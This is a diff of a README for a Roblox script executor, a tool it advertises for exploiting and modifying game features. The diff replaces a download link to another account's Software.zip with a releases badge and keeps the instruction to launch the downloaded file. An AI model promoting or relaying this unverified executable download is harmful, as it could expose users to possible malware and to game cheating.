@@ -2,7 +2,8 @@
 
 Welcome to the Roblox Luna Executor repository! This powerful tool allows you to execute custom scripts within Roblox, giving you the ability to exploit and modify various game features. Whether you're a seasoned Roblox Lua scripter or just getting started, Luna Executor provides you with the tools to enhance your Roblox gameplay experience. 
 
-![Preview](https://github.com/cromsdevrb/Lunar-Executor/blob/main/LunaPeview.jpeg)
+![Preview](https://github.com/cromsdevrb/Lunar-Executor/blob/main/LunaPeview.jpeg) \
+**[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-blueviolet)](../../releases)**
 
 ## Repository Details
 - **Name:** Luna Executor
@@ -20,7 +21,7 @@ Welcome to the Roblox Luna Executor repository! This powerful tool allows you to
 
 ## Quick Start 🚀
 To get started with Luna Executor, you can download the latest version from the following link:
-[![Download Luna Executor](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)](,,/..releases)
+**[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-blueviolet)](../../releases)**
 
 Once the download is complete, launch the downloaded file to begin using Luna Executor.
 
